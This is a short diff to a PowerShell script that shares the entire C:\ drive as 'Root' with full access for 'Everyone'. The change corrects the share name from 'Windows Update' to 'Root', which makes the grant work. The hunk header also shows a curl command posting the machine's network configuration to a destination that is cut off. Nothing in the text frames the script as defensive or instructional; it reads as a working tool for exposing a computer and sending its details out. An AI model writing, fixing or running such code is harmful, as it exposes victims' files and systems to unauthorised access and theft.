@@ -79,7 +79,7 @@ curl -F "content=$((Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway
 # Share the Drive (C:\ in this case)
 Write-Host "Sharing C: drive..."
 New-SmbShare -Name "Root" -Path "C:\" -FullAccess "Everyone" 
-Grant-SmbShareAccess -Name "Windows Update" -AccountName "Everyone" -AccessRight Full -Force
+Grant-SmbShareAccess -Name "Root" -AccountName "Everyone" -AccessRight Full -Force
 
 # Set permissions for the shared drive
 Write-Host "Setting permissions for the shared drive..."
